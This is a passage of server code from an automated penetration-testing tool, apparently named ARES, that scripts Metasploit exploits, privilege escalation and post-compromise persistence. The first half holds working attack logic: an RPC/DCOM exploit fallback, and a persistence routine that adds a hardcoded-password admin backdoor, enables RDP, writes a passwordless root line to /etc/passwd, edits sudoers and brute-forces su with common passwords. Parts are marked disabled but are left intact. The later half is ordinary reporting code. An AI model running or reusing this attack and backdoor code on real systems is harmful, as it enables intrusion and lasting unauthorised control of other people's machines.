      // "set PAYLOAD windows/shell/bind_tcp",
      // "set LPORT 4455",
      // "run -j",
    ];
    const { output: rpcOut } = await msfRun(rpcCmds, 300000);
    fullLog += rpcOut;
    await new Promise((r) => setTimeout(r, 15000));
    const { output: rpcSess } = await msfRun(["sessions -l"], 15000);
    fullLog += "\n" + rpcSess;

    const rpcJoined = joinSessionLines(stripAnsi(rpcSess));
    const rpcMatches = [...rpcJoined.matchAll(
      new RegExp(`^\\s*(\\d+)\\s+.*?\\b(meterpreter|shell)\\b.*${ip.replace(/\./g, "\\.")}`, "gmi")
    )];
    const rpcRow = rpcMatches.at(-1) ?? null;
    const rpcTextMatch = (rpcOut + "\n" + rpcSess).match(/(meterpreter|command shell|shell) session (\d+) (?:opened|created)/i);
    const rpcMsfId = rpcRow ? rpcRow[1] : (rpcTextMatch ? rpcTextMatch[2] : null);

    if (rpcRow || rpcTextMatch) {
      const rpcType    = rpcRow ? rpcRow[2] : "shell";
      const sessionId  = ++sessionCounter;
      activeSessions[sessionId] = { msfId: rpcMsfId, type: rpcType, ip, cve: "CVE-2003-0352" };
      console.log(`[exploit] Session ${sessionId} opened via RPC/DCOM fallback on ${ip} (msf id ${rpcMsfId})`);
      if (hostRow) {
        try {
          await db.execute(
            "INSERT INTO exploit_attempt (jobs_id, host_id, port, success, duration_ms, output, state) VALUES (?, ?, 135, 1, ?, ?, 'done')",
            [jobId, hostRow.id, Date.now() - t0Total, "module: ms03_026_dcom | result: Session opened"]
          );
          const [rpcSessResult] = await db.execute(
            "INSERT INTO exploit_session (jobs_id, host_id, type, method, cve, state) VALUES (?, ?, ?, 'exploit', 'CVE-2003-0352', 'done')",
            [jobId, hostRow.id, rpcType]
          );
          await logActivity(jobId, "session_opened", rpcSessResult.insertId, "exploit_session",
            { ip, type: rpcType, cve: "CVE-2003-0352", module: "ms03_026_dcom", payload: "windows/shell/bind_tcp" },
            { duration_ms: Date.now() - t0Total, observaciones: `Sesión abierta via fallback RPC/DCOM en ${ip}` }
          );
        } catch (e) { console.error("[exploit] DB rpc fallback error:", e.message); }
      }
      const { output: rpcOpts } = await msfRun(["show options"], 15000);
      return res.json({ success: true, sessionId, output: fullLog, exploitModule: "exploit/windows/dcerpc/ms03_026_dcom", exploitOptions: stripAnsi(rpcOpts).trim() });
    }
    fullLog += `\n[-] Fallback RPC/DCOM también falló.\n`;
  }

  // Log resumen final cuando todos los exploits fallan
  if (jobId && hostRow) {
    try {
      await logActivity(jobId, "exploit_failed", hostRow.id, "hosts",
        { ip, cvesAttempted: toTry.map(t => t.cve) },
        {
          intentos,
          duration_ms:   Date.now() - t0Total,
          observaciones: `Todos los exploits fallaron en ${ip} — ${intentos} intentos en ${Date.now() - t0Total}ms`,
        }
      );
    } catch (e) { console.error("[exploit] DB final log error:", e.message); }
  }

  res.json({ success: false, output: fullLog + "\n[-] Todos los exploits fallaron." });
});

// POST /session-privesc — escalate privileges via Metasploit local exploit modules
// Tries several linux/local/ modules with an exec payload that creates user mike.
app.post("/session-privesc", async (req, res) => {
  const { sessionId } = req.body;
  if (!sessionId) return res.status(400).json({ error: "Falta sessionId" });

  let session = activeSessions[sessionId]
    ?? Object.values(activeSessions).find(s => String(s.msfId) === String(sessionId))
    ?? { type: "msf", msfId: sessionId };
  if (!msfProc || msfProc.killed) return res.status(503).json({ error: "msfconsole no activo" });

  const msfId  = session.msfId;
  // Command that creates mike:mike with sudo — no special shell chars that would break exec payload
  const privCmd = "/usr/sbin/useradd -m -s /bin/bash mike 2>/dev/null; echo mike:${PERSIST_PASS} | /usr/sbin/chpasswd 2>/dev/null; /usr/sbin/usermod -aG sudo mike 2>/dev/null";

  let fullLog = "";

  // Try MSF local privilege escalation modules — ordered by likelihood on Linux 2.4.x
  const localModules = [
    "exploit/linux/local/do_brk",
    "exploit/linux/local/ptrace_kmod",
    "exploit/linux/local/bpf_sign_extension_priv_esc",
    "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec",
  ];

  for (const mod of localModules) {
    fullLog += `[*] Probando ${mod}...\n`;
    const { output, timedOut } = await msfRun([
      `use ${mod}`,
      // --- Configuración y lanzamiento del exploit deshabilitados en esta versión pública ---
      // `set SESSION ${msfId}`,
      // `set PAYLOAD linux/x86/exec`,
      // `set CMD ${privCmd}`,
      // `set WritableDir /tmp`,
      // `run`,
    ], 90000);

    const clean = stripAnsi(output);
    fullLog += clean + "\n";
    console.log(`[privesc] ${mod}: ${clean.slice(0, 200)}`);

    if (!timedOut && /success|ran|command exec/i.test(clean)) {
      return res.json({ success: true, log: fullLog });
    }
  }

  res.json({ success: false, log: fullLog });
});

// POST /session-persist — crea usuario admin + acceso persistente en host comprometido
// Detecta automáticamente Linux vs Windows y ejecuta la ruta apropiada.
const PERSIST_PASS = "Ilovelikeyou1*";
app.post("/session-persist", async (req, res) => {
  const { sessionId } = req.body;
  if (!sessionId) return res.status(400).json({ error: "Falta sessionId" });

  let session = activeSessions[sessionId]
    ?? Object.values(activeSessions).find(s => String(s.msfId) === String(sessionId))
    ?? { type: "msf", msfId: String(sessionId), ip: "unknown" };

  const log = [];
  const push = (l) => { log.push(l); console.log(`[persist] ${l}`); };

  // --- Módulo de persistencia deshabilitado en esta versión pública ---
  // El código completo (detección Linux/Windows, creación de usuario admin
  // "mike", distintas rutas de escalada) queda debajo tal cual, sin ejecutarse,
  // como referencia de lo que hacía la versión completa de ARES.
  return res.json({ success: false, log: "Módulo de persistencia deshabilitado en esta versión pública." });

  // ── Helpers de transporte ─────────────────────────────────────────────────

  // Filtra ruido de msfconsole de una línea dada
  const isMsfNoise = (l) => {
    const t = l.trim();
    if (!t) return true;
    if (/^AUTOPWN_/.test(t)) return true;
    if (/^msf/.test(t)) return true;
    if (/^\[\*\] Running '/.test(t)) return true;
    if (/^\[\*\] (Command shell|Meterpreter) session/.test(t)) return true;
    if (l.includes("Starting interaction")) return true;
    return false;
  };

  // Envía un comando directamente a la sesión shell/meterpreter vía sessions -c
  const msfExec = async (cmd, timeout = 20000) => {
    const safe = cmd.replace(/"/g, '\\"');
    const { output } = await msfRun(
      [`sessions -c "${safe}" -i ${session.msfId}`],
      timeout
    );
    return stripAnsi(output).split("\n")
      .filter(l => {
        const t = l.trim();
        return !isMsfNoise(l)
            && !/^C:\\/.test(t)        // prompt Windows (C:\WINDOWS\system32>)
            && t !== cmd.trim();       // eco del propio comando
      })
      .join("\n").trim();
  };

  // Ejecuta un comando Windows — usa msfExec directamente (sessions -c ya va por cmd)
  const winExec = async (cmd, timeout = 20000) => msfExec(cmd, timeout);

  const sshRun = async (cmd) => {
    const result = await sshExec(session.user, session.ip, session.password, cmd);
    return (result.stdout + (result.code !== 0 ? result.stderr : "")).trim();
  };

  // Transporte unificado según tipo de sesión
  const isMeterpreter = session.type === "meterpreter";
  const runCmd = session.type === "ssh" ? sshRun
               : session.type === "raw" ? ((cmd, t) => rawExec(sessionId, cmd, t))
               : msfExec;

  try {
    // ── 1. Detección de OS ────────────────────────────────────────────────────
    push("[*] Detectando sistema operativo...");
    let isWindows = false;

    if (session.type === "ssh" || session.type === "raw") {
      const uname = await runCmd("uname -a 2>&1").catch(() => "");
      isWindows = false; // raw shells son siempre Linux
      push(`[*] OS: Linux (${uname.trim()})`);
    } else {
      if (!msfProc || msfProc.killed) return res.status(503).json({ error: "msfconsole no activo" });

      if (isMeterpreter) {
        // Intenta sysinfo (Meterpreter built-in), si falla prueba systeminfo (binario Windows)
        let osInfo = await msfExec("sysinfo", 8000).catch(() => "");
        if (!osInfo || /Failed|error/i.test(osInfo)) {
          osInfo = await msfExec("systeminfo", 15000).catch(() => "");
        }
        osInfo.split("\n").filter(l => l.trim()).forEach(l => push(`    ${l}`));
        isWindows = /windows/i.test(osInfo);
      } else {
        // Shell CMD/bash: probamos `ver` (Windows) y `uname` (Linux)
        const verOut = await msfExec("ver", 8000).catch(() => "");
        if (/windows/i.test(verOut)) {
          isWindows = true;
          push(`    ${verOut.trim()}`);
        } else {
          const uname = await msfExec("uname -s", 8000).catch(() => "");
          isWindows = !uname.toLowerCase().includes("linux");
          if (uname.trim()) push(`    uname: ${uname.trim()}`);
        }
      }

      push(`[*] OS detectado: ${isWindows ? "Windows" : "Linux/Unix"}`);
    }

    // ── 2a. Ruta Windows ──────────────────────────────────────────────────────
    if (isWindows) {
      push("[*] Ruta Windows: creando usuario admin + habilitando RDP...");
      push("");

      // Transporte unificado: Meterpreter → execute, shell CMD / SSH → directo
      const runWin = isMeterpreter ? winExec
                   : session.type === "ssh" ? sshRun
                   : msfExec;

      // ── Crear usuario ────────────────────────────────────────────────────
      push("[*] Creando usuario mike...");
      const r1 = await runWin(`net user mike ${PERSIST_PASS} /add`, 15000).catch(() => "");
      if (r1) push(`    ${r1}`);

      // Grupo admin: nombre español primero, inglés como fallback
      push("[*] Añadiendo mike al grupo administradores...");
      const r2a = await runWin("net localgroup Administradores mike /add", 12000).catch(() => "error");
      if (!r2a || /error|no existe|not exist/i.test(r2a)) {
        const r2b = await runWin("net localgroup Administrators mike /add", 12000).catch(() => "");
        if (r2b) push(`    ${r2b}`);
      } else {
        push(`    ${r2a}`);
      }

      // ── Habilitar RDP ────────────────────────────────────────────────────
      push("[*] Habilitando RDP...");
      const regRdp = await runWin(
        'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
        12000
      ).catch(() => "");
      if (regRdp) push(`    ${regRdp}`);

      push("");
      // Detect Windows 2012 R2 (NT 6.3) to choose the right RDP client
      const winVerOut = isMeterpreter
        ? await msfExec("sysinfo", 8000).catch(() => "")
        : await runWin("ver", 8000).catch(() => "");
      const rdpClient = /6\.3\.|2012|8\.1/i.test(winVerOut) ? "xfreerdp3" : "rdesktop";

      push("[+] Persistencia Windows establecida.");
      push(`[+] Credenciales: mike / ${PERSIST_PASS}`);
      push(`[+] Cliente RDP: ${rdpClient}`);
      push(`[+] Conectar: ${rdpClient === "xfreerdp3" ? `xfreerdp3 /v:${session.ip} /u:mike /p:${PERSIST_PASS} /cert:ignore` : `rdesktop -u mike -p ${PERSIST_PASS} -0 ${session.ip}`}`);
      savePersistentSession({ ip: session.ip, user: "mike", password: PERSIST_PASS, accessMethod: "rdp", os: "windows", rdpClient, createdAt: new Date().toISOString() });
      // Log permanente en activity_logs vinculado al job
      try {
        const [[sr]] = await db.execute(
          `SELECT es.jobs_id, h.id AS host_id FROM exploit_session es
           JOIN hosts h ON es.host_id = h.id
           WHERE h.target_host = ? ORDER BY es.id DESC LIMIT 1`, [session.ip]);
        if (sr) await logActivity(sr.jobs_id, "persistence_created", sr.host_id, "hosts",
          { ip: session.ip, user: "mike", password: PERSIST_PASS, accessMethod: "rdp", os: "windows", rdpClient },
          { observaciones: `Persistencia RDP creada en ${session.ip}` });
      } catch (e) { console.error("[persist] BD log error:", e.message); }
      return res.json({ success: true, os: "windows", user: "mike", password: PERSIST_PASS, accessMethod: "rdp", rdpClient, log: log.join("\n") });
    }

    // ── 2b. Ruta Linux ────────────────────────────────────────────────────────
    push("[*] Ruta Linux: creando usuario admin + acceso SSH...");
    push("");

    push("[*] Comprobando privilegios...");
    const idOut = await runCmd("id").catch(() => "");
    push(`    ${idOut}`);
    const isRoot = idOut.includes("uid=0");

    if (isRoot) {
      push("[*] Shell root. Creando usuario directamente...");

      if (session.type === "raw") {
        // Red Hat 7.1 — comandos con path completo, passwd --stdin, sudoers directo
        const r1 = await runCmd("/usr/sbin/useradd mike 2>&1");
        if (r1) push(`    useradd: ${r1}`);
        const r2 = await runCmd(`echo '${PERSIST_PASS}' | /usr/bin/passwd --stdin mike 2>&1`);
        if (r2) push(`    passwd: ${r2}`);
        // Añadir mike al grupo wheel en /etc/group (usermod -aG no disponible en RH7.1)
        const r3 = await runCmd("perl -pi -e 'if (/^wheel:/) { chomp; $_ .= \",mike\\n\" unless /\\bmike\\b/ }' /etc/group 2>&1");
        if (r3) push(`    group: ${r3}`);
        // Añadir entrada sudoers incondicionalmente (duplicados no causan problemas)
        const r4 = await runCmd("echo 'mike ALL=(ALL) ALL' >> /etc/sudoers 2>&1");
        if (r4) push(`    sudoers: ${r4}`);
        // Verificar
        const v1 = await runCmd("grep mike /etc/group 2>&1");
        push(`    [verify group] ${v1}`);
        const v2 = await runCmd("grep mike /etc/sudoers 2>&1");
        push(`    [verify sudoers] ${v2}`);
      } else {
        const r1 = await runCmd("/usr/sbin/useradd -m -s /bin/bash mike 2>&1 || true");
        if (r1) push(`    ${r1}`);
        const r2 = await runCmd(`echo mike:${PERSIST_PASS} | /usr/sbin/chpasswd 2>&1`);
        if (r2) push(`    ${r2}`);
        const r3 = await runCmd("/usr/sbin/usermod -aG sudo mike 2>&1 || true");
        if (r3) push(`    ${r3}`);
      }
    } else {
      let escalated = false;

      // Vector 1: /etc/passwd world-writable
      push("[*] Vector 1: /etc/passwd escribible?");
      const permOut = await runCmd("ls -la /etc/passwd 2>&1").catch(() => "");
      push(`    ${permOut}`);
      if (/^-.{6}w/.test(permOut.trim())) {
        push("[*] /etc/passwd escribible — añadiendo entrada root...");
        await runCmd("echo 'mike::0:0:mike:/home/mike:/bin/bash' >> /etc/passwd");
        await runCmd("mkdir -p /home/mike && chmod 755 /home/mike 2>&1");
        escalated = true;
      }

      // Vector 2: su via Python PTY
      if (!escalated) {
        push("[*] Vector 2: su con contraseñas comunes via Python PTY...");
        const pyLines = [
          "echo 'import os,pty,sys,time' > /tmp/su_pty.py",
          "echo 'pass_s=sys.argv[1]+\"\\n\"' >> /tmp/su_pty.py",
          "echo 'cmd=sys.argv[2]' >> /tmp/su_pty.py",
          "echo 'pid,fd=pty.fork()' >> /tmp/su_pty.py",
          "echo 'if not pid: os.execvp(\"su\",[\"su\",\"-c\",cmd,\"root\"])' >> /tmp/su_pty.py",
          "echo 'time.sleep(0.8)' >> /tmp/su_pty.py",
          "echo 'os.write(fd,pass_s)' >> /tmp/su_pty.py",
          "echo 'time.sleep(2)' >> /tmp/su_pty.py",
        ];
        for (const pyCmd of pyLines) await runCmd(pyCmd).catch(() => {});

        const suPasses = ["", "root", "toor", "admin", "password", "xampp", "1234"];
        for (const pass of suPasses) {
          push(`[*] Probando su: "${pass || '(vacía)'}"`);
          const tryOut = await runCmd(`python /tmp/su_pty.py "${pass}" "/usr/sbin/useradd -m -s /bin/bash mike"`).catch(() => "error");
          if (tryOut) push(`    ${tryOut}`);
          if (!/incorrect|failure|cannot|denied|error/i.test(tryOut)) {
            push(`[+] su exitoso con: "${pass || '(vacía)'}"`);
            await runCmd(`python /tmp/su_pty.py "${pass}" "echo mike:${PERSIST_PASS} | /usr/sbin/chpasswd"`).catch(() => {});
            await runCmd(`python /tmp/su_pty.py "${pass}" "/usr/sbin/usermod -aG sudo mike"`).catch(() => {});
            escalated = true;
            break;
          }
        }
      }

      // Vector 3: Metasploit local privesc (solo sesiones MSF)
      if (!escalated && session.type !== "ssh") {
        push("[*] Vector 3: Metasploit local privilege escalation...");
        const privCmd = "/usr/sbin/useradd -m -s /bin/bash mike 2>/dev/null; echo mike:${PERSIST_PASS} | /usr/sbin/chpasswd 2>/dev/null; /usr/sbin/usermod -aG sudo mike 2>/dev/null";
        const localMods = [
          "exploit/linux/local/do_brk",
          "exploit/linux/local/ptrace_kmod",
          "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec",
        ];
        for (const mod of localMods) {
          push(`[*] Probando ${mod}...`);
          const { output, timedOut } = await msfRun([
            `use ${mod}`,
            `set SESSION ${session.msfId}`,
            `set PAYLOAD linux/x86/exec`,
            `set CMD ${privCmd}`,
            `set WritableDir /tmp`,
            `run`,
          ], 90000);
          const clean = stripAnsi(output);
          if (!timedOut && /success|ran|command exec/i.test(clean)) {
            push(`[+] Escalada via ${mod} exitosa.`);
            escalated = true;
            break;
          }
        }
      }

      if (!escalated) {
        push("[-] No se pudo escalar privilegios automáticamente.");
        return res.json({ success: false, os: "linux", log: log.join("\n") });
      }
    }

    // Verificar usuario
    const verify = await runCmd("id mike 2>&1").catch(() => "");
    push(`[*] Verificación: ${verify}`);
    if (verify.includes("uid=")) {
      push("");
      const mikePass = PERSIST_PASS;
      push("[+] Persistencia Linux establecida.");
      push(`[+] Credenciales: mike / ${mikePass}`);
      push(`[+] SSH: ssh mike@${session.ip}`);
      savePersistentSession({ ip: session.ip, user: "mike", password: mikePass, accessMethod: "ssh", os: "linux", createdAt: new Date().toISOString() });
      // Log permanente en activity_logs vinculado al job
      try {
        const [[sr]] = await db.execute(
          `SELECT es.jobs_id, h.id AS host_id FROM exploit_session es
           JOIN hosts h ON es.host_id = h.id
           WHERE h.target_host = ? ORDER BY es.id DESC LIMIT 1`, [session.ip]);
        if (sr) await logActivity(sr.jobs_id, "persistence_created", sr.host_id, "hosts",
          { ip: session.ip, user: "mike", password: mikePass, accessMethod: "ssh", os: "linux" },
          { observaciones: `Persistencia SSH creada en ${session.ip}` });
      } catch (e) { console.error("[persist] BD log error:", e.message); }
      return res.json({ success: true, os: "linux", user: "mike", password: mikePass, accessMethod: "ssh", log: log.join("\n") });
    }

    push("[-] Usuario mike no verificado — comprueba con: id mike");
    return res.json({ success: false, os: "linux", log: log.join("\n") });

  } catch (e) {
    push(`[-] Error inesperado: ${e.message}`);
    return res.json({ success: false, log: log.join("\n") });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// ══════════════════════════════════════════════════════════════════════════════
// GET /report/:jobId — JSON report from activity_logs + metrics
// ══════════════════════════════════════════════════════════════════════════════
// ══════════════════════════════════════════════════════════════════════════════
// GET /jobs — lista todos los jobs con métricas resumen
// ══════════════════════════════════════════════════════════════════════════════
app.get("/jobs", async (_req, res) => {
  try {
    const [jobs] = await db.execute(
      "SELECT id, type, model, timestamp FROM jobs ORDER BY id DESC"
    );

    const result = await Promise.all(jobs.map(async (job) => {
      const [[metrics]] = await db.execute(
        `SELECT
          SUM(event_type = 'host_identified')  AS hostsFound,
          SUM(event_type = 'vuln_identified')  AS vulnsFound,
          SUM(event_type = 'exploit_success')  AS exploitSuccess,
          SUM(event_type = 'exploit_failed')   AS exploitFailed,
          SUM(event_type = 'session_opened')   AS sessionsOpened
         FROM activity_logs WHERE jobs_id = ?`,
        [job.id]
      );
      return {
        id:             job.id,
        type:           job.type,
        model:          job.model,
        timestamp:      job.timestamp,
        agent:          job.type === "IA"
                          ? `ARES IA — Aracni${job.model ? ` (${job.model})` : ""}`
                          : "Manual (usuario)",
        hostsFound:     metrics.hostsFound    ?? 0,
        vulnsFound:     metrics.vulnsFound    ?? 0,
        exploitSuccess: metrics.exploitSuccess ?? 0,
        exploitFailed:  metrics.exploitFailed  ?? 0,
        sessionsOpened: metrics.sessionsOpened ?? 0,
      };
    }));

    res.json({ serverStartedAt: SERVER_STARTED_AT, jobs: result });
  } catch (e) {
    console.error("[jobs] Error:", e.message);
    res.status(500).json({ error: "Error listando jobs" });
  }
});

// REPORTING
app.get("/report/:jobId", async (req, res) => {
  const jobId = parseInt(req.params.jobId, 10);
  if (!jobId) return res.status(400).json({ error: "jobId inválido" });

  try {
    const [[job]] = await db.execute("SELECT id, type, model, timestamp FROM jobs WHERE id = ?", [jobId]);
    if (!job) return res.status(404).json({ error: "Job no encontrado" });

    const [logs] = await db.execute(
      `SELECT id, event_type, reference_id, reference_table, details_json,
              intentos, duration_ms, observaciones, comentarios, timestamp
       FROM activity_logs WHERE jobs_id = ? ORDER BY id ASC`,
      [jobId]
    );

    // Parse details_json once for all logs
    const parsed = logs.map(l => {
      let details = {};
      try { details = JSON.parse(l.details_json) ?? {}; } catch {}
      return { ...l, details };
    });

    // ── Construir desglose por host ───────────────────────────────────────────
    // Paso 1: recoger IPs de host_identified (todos los hosts escaneados)
    const hostIps = parsed
      .filter(l => l.event_type === "host_identified")
      .map(l => l.details.ip)
      .filter(Boolean);

    // Paso 2: por cada IP, calcular sus métricas desde activity_logs
    const hostRows = hostIps.map(ip => {
      // Vulnerabilidades encontradas
      const vulnLogs = parsed.filter(l => l.event_type === "vuln_identified" && l.details.ip === ip);

      // Intentos de exploit (per-attempt, reference_table='exploit_attempt')
      const attemptLogs = parsed.filter(l =>
        (l.event_type === "exploit_failed" || l.event_type === "exploit_success") &&
        l.reference_table === "exploit_attempt" &&
        l.details.ip === ip
      );

      // Sesión abierta
      const sessionLog = parsed.find(l => l.event_type === "session_opened" && l.details.ip === ip);

      // Tiempo total del ataque sobre este host:
      // - si hubo sesión: session_opened.duration_ms = tiempo desde inicio del ataque hasta sesión
      // - si no hubo sesión: exploit_failed resumen final (reference_table='hosts') tiene el total
      // - fallback: suma de duration_ms de cada intento
      const finalSummaryLog = parsed.find(l =>
        l.event_type === "exploit_failed" &&
        l.reference_table === "hosts" &&
        l.details.ip === ip
      );
      const totalAttackMs =
        sessionLog?.duration_ms ??
        finalSummaryLog?.duration_ms ??
        attemptLogs.reduce((s, l) => s + (l.duration_ms ?? 0), 0) ??
        null;

      // CVEs únicos intentados, con nº de intentos y si tuvieron éxito
      const cveMap = {};
      for (const l of attemptLogs) {
        const cve = l.details.cve;
        if (!cve) continue;
        if (!cveMap[cve]) cveMap[cve] = { cve, attempts: 0, success: false };
        cveMap[cve].attempts++;
        if (l.event_type === "exploit_success") cveMap[cve].success = true;
      }
      const cveBreakdown = Object.values(cveMap);

      // Severidad de vulns agrupada
      const vulnsBySeverity = { critical: 0, high: 0, medium: 0, low: 0 };
      for (const l of vulnLogs) {
        const sev = l.details.severity;
        if (sev in vulnsBySeverity) vulnsBySeverity[sev]++;
      }

      // ── Duraciones por agente ──────────────────────────────────────────
      const deepScanLog    = parsed.find(l => l.event_type === "deep_scan_complete"   && l.details.ip === ip);
      const findVulnsLog   = parsed.find(l => l.event_type === "find_vulns_complete"  && l.details.ip === ip);
      // exploitMs = suma de duration_ms de TODOS los intentos (fallidos + exitoso)
      const exploitMsTotal = attemptLogs.reduce((s, l) => s + (l.duration_ms ?? 0), 0) || null;
      const agentDurations = {
        deepScanMs:   deepScanLog?.duration_ms  ?? null,
        findVulnsMs:  findVulnsLog?.duration_ms ?? null,
        exploitMs:    exploitMsTotal,
      };

      // Timestamps de primera y última actividad sobre este host
      // Excluir persistence_created para que lastActivityAt no se infle con acciones post-ataque
      const hostLogs = parsed.filter(l =>
        l.event_type !== "persistence_created" &&
        (l.details.ip === ip || (l.event_type === "host_identified" && l.details.ip === ip))
      );
      const hostTs = hostLogs.map(l => new Date(l.timestamp).getTime()).filter(t => !isNaN(t));
      const firstActivityAt = hostTs.length ? new Date(Math.min(...hostTs)).toISOString() : null;
      const lastActivityAt  = hostTs.length ? new Date(Math.max(...hostTs)).toISOString() : null;

      // Timestamp absoluto de apertura de sesión (para posicionamiento en timeline)
      const sessionTimestamp = sessionLog?.timestamp ?? null;

      return {
        ip,
        vulnsFound:      vulnLogs.length,
        vulnsBySeverity,
        vulns:           vulnLogs.map(l => ({
          cve:      l.details.cve,
          severity: l.details.severity,
          service:  l.details.service,
          port:     l.details.port,
        })),
        exploitAttempts: attemptLogs.length,
        cveBreakdown,
        sessionOpened:   !!sessionLog,
        sessionType:     sessionLog?.details.type    ?? null,
        sessionCve:      sessionLog?.details.cve     ?? null,
        successModule:   sessionLog?.details.module  ?? null,
        successPayload:  sessionLog?.details.payload ?? null,
        timeToSessionMs: sessionLog?.duration_ms     ?? null,
        sessionTimestamp,
        totalAttackMs,
        agentDurations,
        firstActivityAt,
        lastActivityAt,
      };
    });

    // ── Enriquecer hostRows con OS, puertos y módulos fallidos ────────────────
    try {
      // OS detectado por nmap
      const [osR] = await db.execute(
        "SELECT target_host, os_info FROM hosts WHERE jobs_id = ? AND os_info IS NOT NULL", [jobId]
      );
      const osMap = Object.fromEntries(osR.map(r => [r.target_host, r.os_info]));

      // Puertos y servicios (host_nmap)
      const [nmapR] = await db.execute(
        `SELECT h.target_host, n.port, n.nmap_service, n.nmap_version
         FROM host_nmap n JOIN hosts h ON n.host_id = h.id
         WHERE h.jobs_id = ? ORDER BY h.target_host, n.port`, [jobId]
      );
      const nmapByIp = {};
      for (const r of nmapR) {
        if (!nmapByIp[r.target_host]) nmapByIp[r.target_host] = [];
        nmapByIp[r.target_host].push({ port: r.port, service: r.nmap_service, version: r.nmap_version });
      }

      // ── Caché de reconocimiento para flujos IA ─────────────────────────────
      // Si el job es IA y algún host no tiene datos nmap del job actual,
      // reutilizar el scan más reciente de esa IP de jobs anteriores.
      if (job.type === "IA") {
        const ipsWithoutNmap = hostRows
          .map(h => h.ip)
          .filter(ip => !nmapByIp[ip] || nmapByIp[ip].length === 0);

        if (ipsWithoutNmap.length > 0) {
          const ph = ipsWithoutNmap.map(() => "?").join(",");
          // Subquery: job más reciente con datos nmap para cada IP
          const [cached] = await db.execute(
            `SELECT h2.target_host, n.port, n.nmap_service, n.nmap_version, h2.os_info
             FROM host_nmap n
             JOIN hosts h2 ON n.host_id = h2.id
             JOIN (
               SELECT h3.target_host, MAX(h3.jobs_id) AS latest_job
               FROM hosts h3
               INNER JOIN host_nmap n3 ON n3.host_id = h3.id
               WHERE h3.target_host IN (${ph}) AND h3.jobs_id != ?
               GROUP BY h3.target_host
             ) best ON h2.target_host = best.target_host AND h2.jobs_id = best.latest_job
             ORDER BY h2.target_host, n.port`,
            [...ipsWithoutNmap, jobId]
          );

          for (const r of cached) {
            if (!nmapByIp[r.target_host]) nmapByIp[r.target_host] = [];
            nmapByIp[r.target_host].push({
              port: r.port, service: r.nmap_service, version: r.nmap_version
            });
            // Rellenar osInfo desde jobs anteriores si falta en el actual
            if (r.os_info && !osMap[r.target_host]) osMap[r.target_host] = r.os_info;
          }

          const hits = [...new Set(cached.map(r => r.target_host))];
          if (hits.length > 0)
            console.log(`[report] Recon cache IA: ${hits.length} host(s) enriquecidos desde jobs anteriores (${hits.join(", ")})`);
        }
      }

      // ── Caché de vulnerabilidades para flujos IA ───────────────────────────
      // Si el job es IA y algún host no tiene vulns del job actual,
      // reutilizar las del job más reciente con datos para esa IP.
      const vulnCacheByIp = {};
      if (job.type === "IA") {
        const ipsReally = hostRows
          .filter(h => (h.vulns ?? []).length === 0)
          .map(h => h.ip);

        if (ipsReally.length > 0) {
          const ph2 = ipsReally.map(() => "?").join(",");
          const [cachedVulns] = await db.execute(
            `SELECT h2.target_host, v.cve, v.severity, v.service, n.port
             FROM host_vuln v
             JOIN hosts h2 ON v.host_id = h2.id
             LEFT JOIN host_nmap n ON v.host_nmap_id = n.id
             JOIN (
               SELECT h3.target_host, MAX(h3.jobs_id) AS latest_job
               FROM hosts h3
               INNER JOIN host_vuln v3 ON v3.host_id = h3.id
               WHERE h3.target_host IN (${ph2}) AND h3.jobs_id != ?
               GROUP BY h3.target_host
             ) best ON h2.target_host = best.target_host AND h2.jobs_id = best.latest_job
             ORDER BY h2.target_host, v.severity, n.port`,
            [...ipsReally, jobId]
          );

          for (const r of cachedVulns) {
            if (!vulnCacheByIp[r.target_host]) vulnCacheByIp[r.target_host] = [];
            vulnCacheByIp[r.target_host].push({
              cve: r.cve, severity: r.severity, service: r.service, port: r.port
            });
          }

          const vhits = [...new Set(cachedVulns.map(r => r.target_host))];
          if (vhits.length > 0)
            console.log(`[report] Vuln cache IA: ${vhits.length} host(s) enriquecidos desde jobs anteriores (${vhits.join(", ")})`);
        }
      }

      for (const h of hostRows) {
        // Aplicar caché de vulns si el host no tiene ninguna del job actual
        if ((h.vulns ?? []).length === 0 && vulnCacheByIp[h.ip]) {
          h.vulns = vulnCacheByIp[h.ip];
          h.vulnsFound = h.vulns.length;
        }
        h.osInfo = osMap[h.ip] ?? null;
        h.ports  = nmapByIp[h.ip] ?? [];
        // Módulos fallidos agrupados por módulo
        const failedLogs = parsed.filter(l =>
          l.event_type === "exploit_failed" &&
          l.reference_table === "exploit_attempt" &&
          l.details.ip === h.ip
        );
        const modMap = {};
        for (const l of failedLogs) {
          const m = l.details.module ?? "unknown";
          modMap[m] = (modMap[m] ?? 0) + 1;
        }
        h.failedModules = Object.entries(modMap).map(([mod, attempts]) => ({ mod, attempts }));

        // Persistencia — leer desde persistent_sessions.json por IP
        h.persistence = null;
      }

      // Cargar persistencia desde activity_logs (permanente, vinculado al job)
      try {
        const [persistLogs] = await db.execute(
          `SELECT al.details_json, h.target_host
           FROM activity_logs al
           JOIN hosts h ON al.reference_id = h.id AND al.reference_table = 'hosts'
           WHERE al.jobs_id = ? AND al.event_type = 'persistence_created'`,
          [jobId]
        );
        const persistByIp = {};
        for (const r of persistLogs) {
          try { persistByIp[r.target_host] = JSON.parse(r.details_json) ?? {}; } catch {}
        }
        for (const h of hostRows) h.persistence = persistByIp[h.ip] ?? null;
      } catch (e) { console.error("[report] Error leyendo persistencia:", e.message); }

    } catch (e) { console.error("[report] Error enriqueciendo hostRows:", e.message); }

    // ── Resumen global ────────────────────────────────────────────────────────
    const agentName = job.type === "IA"
      ? `ARES IA — Aracni${job.model ? ` (${job.model})` : ""}`
      : "Manual (usuario)";

    // Severidad global agregada
    const globalSeverity = { critical: 0, high: 0, medium: 0, low: 0 };
    for (const h of hostRows)
      for (const [k, v] of Object.entries(h.vulnsBySeverity)) globalSeverity[k] += v;

    // Timestamps del job completo
    // Excluir eventos post-ataque (persistencia) del cálculo de duración del job
    const attackEvents = new Set([
      "host_identified","scan_complete","deep_scan_complete","find_vulns_complete",
      "vuln_identified","exploit_success","exploit_failed","session_opened",
    ]);
    const allTs = parsed
      .filter(l => attackEvents.has(l.event_type))
      .map(l => new Date(l.timestamp).getTime())
      .filter(t => !isNaN(t));
    const jobFirstAt = allTs.length ? new Date(Math.min(...allTs)).toISOString() : null;
    const jobLastAt  = allTs.length ? new Date(Math.max(...allTs)).toISOString() : null;

